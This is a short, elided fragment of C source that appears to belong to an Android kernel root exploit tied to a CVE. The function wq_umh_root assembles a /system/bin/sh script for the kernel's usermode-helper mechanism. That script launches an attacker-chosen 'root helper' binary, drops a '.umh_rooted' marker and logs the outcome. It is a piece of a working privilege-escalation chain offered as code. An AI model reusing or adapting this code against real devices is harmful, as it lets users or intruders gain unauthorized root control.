...
static __attribute__((always_inline)) int wq_umh_root(int afd) {
  ...
  const char *app_root_helper = getenv("CVE43499_ROOT_HELPER");
  char app_daemon[768] = {0};
  if (app_root_helper && app_root_helper[0]) {
    snprintf(app_daemon, sizeof(app_daemon),
             "\"%s\" --umh %u \"$A/.umh_rooted\" > $A/root-helper.out 2>&1 &\n",
             app_root_helper, (unsigned)getuid());
  }
  const char *umh_sh_prefix =
    "#!/system/bin/sh\n"
  ...
  const char *umh_sh_suffix =
    ...
    "echo CAPTURES-DONE\n";
  size_t umh_sh_len = strlen(umh_sh_prefix) + strlen(app_daemon) +
                      strlen(umh_sh_suffix) + 1;
  char *umh_sh = malloc(umh_sh_len);
  if (!umh_sh)
    pr_error("wq-umh: helper script allocation failed\n");
  snprintf(umh_sh, umh_sh_len, "%s%s%s", umh_sh_prefix, app_daemon,
           umh_sh_suffix);
